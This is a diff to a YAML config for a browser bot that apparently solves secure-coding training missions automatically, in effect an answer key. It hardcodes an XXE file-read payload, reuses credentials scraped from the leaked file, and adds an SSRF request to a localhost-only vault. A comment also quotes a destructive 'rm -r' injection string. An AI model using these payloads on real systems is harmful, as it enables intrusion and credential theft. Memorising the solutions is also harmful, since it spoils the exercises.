@@ -18,6 +18,158 @@
 # we've actually observed (selectors/frames), the way we do for page states.
 
 steps:
+  # === Boat Insurances XXE mission (a Swagger/OpenAPI app, NOT Viking Bank) =========
+  # This mission's app frame [0,0,0] is a Swagger UI API explorer (endpoints you expand,
+  # a "Try it out" toggle, a JSON/XML request body, an Execute button, a response body) —
+  # a wholly different app type from the Viking Bank mocked web app the other handlers
+  # drive. These handlers puppet that Swagger UI. Solved + verified LIVE end-to-end
+  # 2026-07-13: every instr-check ticked as each step ran; mission "Congratulations!"
+  # (XXE) panel reached. Placed ABOVE the Viking Bank login handlers on purpose — step 7
+  # ("Log in as an Employee") starts with "Log in" and names an email in backticks, so the
+  # generic `login-as` below would otherwise poach it and type into a #Username form that
+  # doesn't exist in this app.
+  #
+  # SWAGGER RELIABILITY: expanding an endpoint and toggling "Try it out" is React-timed and
+  # flaky as separate UI clicks (the first try-out click right after an expand silently
+  # no-ops). The reliable recipe, used throughout below, is a SINGLE eval that (a) clicks
+  # the summary if the block is closed and (b) clicks try-out if it isn't already "Cancel":
+  # programmatic .click()s dispatch discrete events that flush React synchronously, so both
+  # land in one pass. Request bodies/params are React-controlled inputs, so we set them via
+  # the native value setter + an 'input' event (the take-over-session cookie-write trick),
+  # never Selenium typing. Execute is then a normal UI click (its own round-trip settles the
+  # state first). NOTE: the byReg `do` wraps the injected XML in DOUBLE quotes, so an xml
+  # payload must contain no `"` (the XXE payload uses single quotes — fine).
+
+  # Step 0 "Obtain a token for Eve": POST /api/auth/token with the username + password named
+  # in backticks in the copy; the JSON response carries the JWT step 1 authorizes with. The
+  # token `do` (anchored) is shared verbatim by step 7 (employee login) — same request, only
+  # the credentials differ.
+  - id: swagger-obtain-token
+    match:
+      title_regex: '(?i)^obtain a token'
+    extract:
+      username: { from: description, regex: '`([\w.+-]+@[\w.-]+)`' }
+      password: { from: description, regex: 'password\s+`([^`]+)`', default: 'P@ssw0rd1!' }
+    do: &swagger_token_do
+      - eval:
+          frame: "0/0/0"
+          script: >-
+            var o=document.querySelector('#operations-Auth-post_api_auth_token');
+            if(!o.classList.contains('is-open'))o.querySelector('.opblock-summary-control').click();
+            var t=o.querySelector('.try-out__btn'); if(t&&t.textContent.trim()!=='Cancel')t.click();
+            var ta=o.querySelector('.body-param__text');
+            var s=Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype,'value').set;
+            s.call(ta, JSON.stringify({username:'{username}',password:'{password}'}));
+            ta.dispatchEvent(new Event('input',{bubbles:true}));
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#operations-Auth-post_api_auth_token .execute', settle: 3 }
+
+  # Step 1 "Authenticate as Eve": copy the JWT out of step 0's response, open the Authorize
+  # modal (top "Authorize" button in .auth-wrapper), enter "bearer <token>", submit, close.
+  # Reads the token straight off the token endpoint's on-page response, so no cross-step
+  # plumbing. The modal input is React-controlled → native setter + 'input' event.
+  - id: swagger-authenticate
+    match:
+      title_regex: '(?i)^authenticate as'
+    do:
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '.auth-wrapper .btn.authorize', settle: 1 }
+      - eval:
+          frame: "0/0/0"
+          script: >-
+            var m=(document.querySelector('#operations-Auth-post_api_auth_token .response-col_description .microlight')||{}).textContent||'';
+            var t=(m.match(/"token":\s*"([^"]+)"/)||[])[1]||'';
+            var inp=document.querySelector('.auth-container input, .modal-ux input');
+            var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;
+            s.call(inp,'bearer '+t);
+            inp.dispatchEvent(new Event('input',{bubbles:true}));
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '.modal-btn.authorize', settle: 1 }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '.modal-btn.btn-done', settle: 1 }
+
+  # Step 2 "View all Eve's boats": GET /api/boats + Execute (auth from step 1 applies
+  # automatically). The returned list's registration numbers feed step 3.
+  - id: swagger-view-boats
+    match:
+      title_regex: "(?i)^view all .*boats"
+    do:
+      - eval:
+          frame: "0/0/0"
+          script: >-
+            var o=document.querySelector('#operations-Boat-get_api_boats');
+            if(!o.classList.contains('is-open'))o.querySelector('.opblock-summary-control').click();
+            var t=o.querySelector('.try-out__btn'); if(t&&t.textContent.trim()!=='Cancel')t.click();
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#operations-Boat-get_api_boats .execute', settle: 3 }
+
+  # Step 3 "View detailed info of a boat": GET /api/boats/byRegistrationNumber with an XML
+  # param whose <RegistrationNumber> is one of your own boats — read LIVE from step 2's boats
+  # response (first <RegistrationNumber>), so it survives data rotation. The byReg `do`
+  # (anchored) is shared by steps 4 and 6; each supplies a different `xml`.
+  - id: swagger-view-boat-detail
+    match:
+      title_regex: '(?i)^view detailed info of a boat'
+    context:
+      xml:
+        frame: "0/0/0"
+        eval: >-
+          var m=(document.querySelector('#operations-Boat-get_api_boats .live-responses-table .microlight')||{}).textContent||'';
+          var r=(m.match(/<RegistrationNumber>([^<]+)<\/RegistrationNumber>/)||[])[1]||'SMH464';
+          return '<ViewBoatRequest><RegistrationNumber>'+r+'</RegistrationNumber></ViewBoatRequest>';
+    do: &swagger_boat_xml_do
+      - eval:
+          frame: "0/0/0"
+          script: >-
+            var o=document.querySelector('#operations-Boat-get_api_boats_byRegistrationNumber');
+            if(!o.classList.contains('is-open'))o.querySelector('.opblock-summary-control').click();
+            var t=o.querySelector('.try-out__btn'); if(t&&t.textContent.trim()!=='Cancel')t.click();
+            var i=o.querySelector('input[placeholder=xml]');
+            var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;
+            s.call(i, "{xml}");
+            i.dispatchEvent(new Event('input',{bubbles:true}));
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#operations-Boat-get_api_boats_byRegistrationNumber .execute', settle: 3 }
+
+  # Step 4 "Insert an invalid registration number": same endpoint, but the copy tells you to
+  # use `XXX000` — a static invalid reg. Reuses the byReg `do`; the error response echoes the
+  # bad input (setup for the XXE step). `xml` is a fixed default (no regex → the default wins).
+  - id: swagger-invalid-reg
+    match:
+      title_regex: '(?i)^insert an invalid registration number'
+    extract:
+      xml: { default: '<ViewBoatRequest><RegistrationNumber>XXX000</RegistrationNumber></ViewBoatRequest>' }
+    do: *swagger_boat_xml_do
+
+  # Step 6 "Exploit XXE and retrieve a file": same endpoint, but the xml is the DOCTYPE/ENTITY
+  # payload named verbatim in the copy — a SYSTEM entity pointing at wwwroot/backup/
+  # CreateDefaultAdmin.sql, referenced as &foo; inside <RegistrationNumber>. The XML parser
+  # allows DTDs, so it resolves the entity and the error message leaks the file contents (the
+  # employee credentials). Static training payload → hardcoded (double-quoted YAML; the
+  # payload's own quotes are single). (Order 5 "Inspect the code" is informational — no
+  # checkbox — so the mission loop skips it; no handler needed.)
+  - id: swagger-exploit-xxe
+    match:
+      title_regex: '(?i)^exploit xxe'
+    extract:
+      xml:
+        default: "<!DOCTYPE foo [ <!ENTITY foo SYSTEM 'wwwroot/backup/CreateDefaultAdmin.sql' >]><ViewBoatRequest><RegistrationNumber>&foo;</RegistrationNumber></ViewBoatRequest>"
+    do: *swagger_boat_xml_do
+
+  # Step 7 "Log in as an Employee": repeat step 0's token request as the employee whose creds
+  # the XXE just leaked. The email is named in the copy (backtick); the password is read LIVE
+  # from step 6's XXE response — the LAST single-quoted token of the leaked SQL INSERT (the
+  # Password column) — so it survives rotation. Reuses the shared token `do`. MUST stay above
+  # `login-as` (below). LIMITATION: assumes the leaked password contains no single quote (it
+  # would break the JS string literal the token `do` builds); the observed one didn't.
+  - id: swagger-login-employee
+    match:
+      title_regex: '(?i)^log in as an employee'
+    extract:
+      username: { from: description, regex: '`([\w.+-]+@[\w.-]+)`' }
+    context:
+      password:
+        frame: "0/0/0"
+        eval: >-
+          var m=(document.querySelector('#operations-Boat-get_api_boats_byRegistrationNumber .live-responses-table .microlight')||{}).textContent||'';
+          var q=m.match(/'[^']*'/g);
+          return q? q[q.length-1].replace(/'/g,'') : '';
+    do: *swagger_token_do
+
   # Log in to the mocked target app (Viking Bank). Fires on every login step —
   # "Log in as Alice", "Log in as Bob", "Log in with an incorrect password" — the
   # only difference being the credentials, which are the backtick-quoted tokens in
@@ -199,10 +351,12 @@ steps:
   #
   # The match is the /`path` token PLUS a nav verb, deliberately broad enough to
   # span both phrasings while never firing on a step that merely *mentions* a path
-  # (e.g. "the link to the /users page is hidden") — those lack the verb.
+  # (e.g. "the link to the /users page is hidden") — those lack the verb. "add" (bare)
+  # is included for vb-56's "you can add /`vault` to the URL" — `add(?:ing)?\b` so it
+  # also covers "adding" without matching "address".
   - id: navigate-endpoint
     match:
-      desc_regex: '(?i)(navigate to|adding|go to|visit).{0,30}/`[^`]+`'
+      desc_regex: '(?i)(navigate to|add(?:ing)?\b|go to|visit).{0,30}/`[^`]+`'
     extract:
       path: { from: description, regex: '/`([^`]+)`' }
     do:
@@ -522,3 +676,144 @@ steps:
       - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Amount', value: '100' }
       - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#Description', value: 'repayment' }
       - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#transfer-btn-submit', settle: 3 }
+
+  # --- Broken Access Control / SSRF "download fallback" mission (vb-56) ---------
+  # Reach a localhost-only /vault by abusing the statement-download endpoint's fallback:
+  #   /statements/download/{id}?fallbackUrl={url}
+  # fetches {url} SERVER-SIDE when {id} doesn't exist (the "fallback"), and {url} is
+  # attacker-controlled → SSRF. 8 instructions (order 0-7); order 2 "Inspect the vault
+  # code" and order 5 "Inspect the URL" are informational (no checkbox → skipped). order 0
+  # "Log in as Alice" is handled by `login-as`, order 1 "Try to access the vault" by
+  # `navigate-endpoint` (nav /`vault` — the "add" alternative in its regex). The four
+  # below cover the rest. Solved + validated LIVE end-to-end 2026-07-13 (mission
+  # "Congratulations!" panel; every instr-check confirmed ticked as each step ran).
+
+  # order 3 "View a statement": open the E-Statements list, then a statement's detail.
+  # The list's "View statement" links are <a href="/statements/{id}"> in the app frame
+  # [0,0,0]; the menu link is the bare /statements (no trailing slash, excluded) and the
+  # download links contain 'download' (excluded). Opening a detail ticks the step.
+  - id: view-statement
+    match:
+      title_regex: '(?i)^view a statement'
+    do:
+      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'statements', enter: true, settle: 3 }
+      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "(//a[starts-with(@href,'/statements/') and not(contains(@href,'download'))])[1]", settle: 3 }
+
+  # order 4 "Download a statement": on a statement detail, click the DOWNLOAD STATEMENT
+  # link (`#download-statement-link`, whose href IS the vulnerable
+  # /statements/download/{id}?fallbackUrl=… endpoint). Self-contained (re-opens a
+  # statement first) so it also works as a resume entry point — the download click
+  # navigates away, so a later step can't assume the detail is still showing.
+  - id: download-statement
+    match:
+      title_regex: '(?i)^download a statement'
+    do:
+      - ui: { action: type,  frame: [0, 0], by: css, selector: '#browserBar', value: 'statements', enter: true, settle: 3 }
+      - ui: { action: click, frame: [0, 0, 0], by: xpath, selector: "(//a[starts-with(@href,'/statements/') and not(contains(@href,'download'))])[1]", settle: 3 }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#download-statement-link', settle: 3 }
+
+  # order 6 "Trigger the fallback": prove the fallback by requesting a NON-EXISTENT
+  # statementId (999) with the ORIGINAL fallbackUrl — the getlatest-transactions API on
+  # the app's own host — so the server, unable to find statement 999, fetches fallbackUrl
+  # and returns "the latest transaction" file. The fallbackUrl is built LIVE from the app
+  # frame's own `location.origin` (the host is per-session/pod) + Alice's fixed account
+  # 94923054, URL-encoded exactly as the page's own link encodes it, then navigated via
+  # the mission chrome #browserBar (frame [0,0], which auto-prepends "/" and pre-fills the
+  # app host). NOTE: 94923054 is Alice's account (see transfer-money); if SCW ever rotates
+  # it, the getlatest fetch 404s and the step won't tick — re-derive from a live
+  # #download-statement-link href.
+  - id: trigger-fallback
+    match:
+      title_regex: '(?i)^trigger the fallback'
+    context:
+      fb:
+        frame: "0/0/0"
+        eval: "return encodeURIComponent(location.origin + '/api/transactions/getlatest/94923054')"
+    do:
+      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'statements/download/999?fallbackUrl={fb}', enter: true, settle: 4 }
+
+  # order 7 "Break into the vault" — the SSRF payoff. Same non-existent statementId 999,
+  # but point fallbackUrl at the localhost-only vault `http://localhost:5000/vault`: the
+  # server fetches it server-side, so the request now ORIGINATES from localhost — the
+  # trusted source the vault's access control checks — and the vault contents come back,
+  # completing the mission. Host-independent (localhost is the app's own box), so it's a
+  # FIXED nav; URL-encoded so the #browserBar doesn't mangle the `://`.
+  - id: break-into-vault
+    match:
+      title_regex: '(?i)^break into the vault'
+    do:
+      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'statements/download/999?fallbackUrl=http%3A%2F%2Flocalhost%3A5000%2Fvault', enter: true, settle: 4 }
+
+  # --- Insufficient logging / monitoring investigation mission (vb-50) -----------
+  # "web.insufficient_logging.generic": the logs DO capture an attacker's command-
+  # injection attempt, but you must investigate to find and act on it. 7 instructions
+  # (order 0-6); order 3 "Copy the suspicious log" is informational (no checkbox → the
+  # loop skips it). order 0 "Log in as admin" is handled by `login-as` (email + password
+  # in backticks). The five below cover the rest. Solved + validated LIVE end-to-end
+  # 2026-07-13 (every instr-check ticked; mission "complete" panel reached).
+  # NOTE: the two nav steps name their endpoint in markdown BOLD (/__logs__, /__users__),
+  # NOT backticks, so `navigate-endpoint` doesn't claim them — hence these title-keyed
+  # handlers. The suspect's Id and the log-evidence text are re-derived LIVE (a same-origin
+  # XHR to the /logs search from the app frame), so they survive per-instance data changes.
+
+  # order 1 "View the monitoring page": nav the #browserBar to /logs (the monitoring page).
+  - id: view-monitoring-page
+    match:
+      title_regex: '(?i)^view the monitoring page'
+    do:
+      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'logs', enter: true, settle: 3 }
+
+  # order 2 "Search for frequently used OS commands": type a common command into the logs
+  # SearchTerm box and submit — surfaces the injection log ("... tried to use invalid
+  # filename 'cd ../.. && rm -r ./* && mkdir pwned'"). `rm` is one of the commands the copy
+  # suggests and hit live; the search + fields are in the app frame [0,0,0].
+  - id: search-os-commands
+    match:
+      title_regex: '(?i)^search for frequently used'
+    do:
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#SearchTerm', value: 'rm' }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#submit', settle: 2 }
+
+  # order 4 "View the users page": nav the #browserBar to /users.
+  - id: view-users-page-logging
+    match:
+      title_regex: '(?i)^view the users page'
+    do:
+      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'users', enter: true, settle: 3 }
+
+  # order 5 "View the user details of the suspect": the suspect's Id is the one named in the
+  # injection log. Re-derive it LIVE — a same-origin sync XHR to the /logs search from the app
+  # frame [0,0,0], regexing the Id out of the "Id <n> tried to use invalid filename" entry —
+  # then nav the #browserBar to /users/<id> (which ticks the step, same as clicking its View).
+  - id: view-suspect-details
+    match:
+      title_regex: '(?i)^view the user details of the suspect'
+    context:
+      id:
+        frame: "0/0/0"
+        eval: >-
+          var x=new XMLHttpRequest();x.open('GET','/logs?SearchTerm=filename',false);x.send();
+          return (x.responseText.match(/Id (\d+) tried to use invalid filename/)||[])[1]||'';
+    do:
+      - ui: { action: type, frame: [0, 0], by: css, selector: '#browserBar', value: 'users/{id}', enter: true, settle: 3 }
+
+  # order 6 "Block the attacker": on the suspect's detail page, paste the log evidence into
+  # the "Enter Log Evidence" field and click Block User. The evidence is the full suspicious
+  # log LINE, re-derived LIVE the same way (XHR to /logs search, then the injection entry's
+  # <p> textContent — which decodes the &#x27;/&amp; entities back to '/& and joins the
+  # timestamp/level/message spans). The pod accepted this exact line live. Both controls are
+  # in the app frame [0,0,0].
+  - id: block-the-attacker
+    match:
+      title_regex: '(?i)^block the attacker'
+    context:
+      evidence:
+        frame: "0/0/0"
+        eval: >-
+          var x=new XMLHttpRequest();x.open('GET','/logs?SearchTerm=filename',false);x.send();
+          var d=document.createElement('div');d.innerHTML=x.responseText;
+          var sp=[...d.querySelectorAll('span')].filter(function(e){return /invalid filename/.test(e.textContent)})[0];
+          return sp? sp.closest('p').textContent.trim().replace(/\s+/g,' ') : '';
+    do:
+      - ui: { action: type,  frame: [0, 0, 0], by: css, selector: '#log-evidence-input', value: '{evidence}' }
+      - ui: { action: click, frame: [0, 0, 0], by: css, selector: '#block-user-btn-submit', settle: 4 }
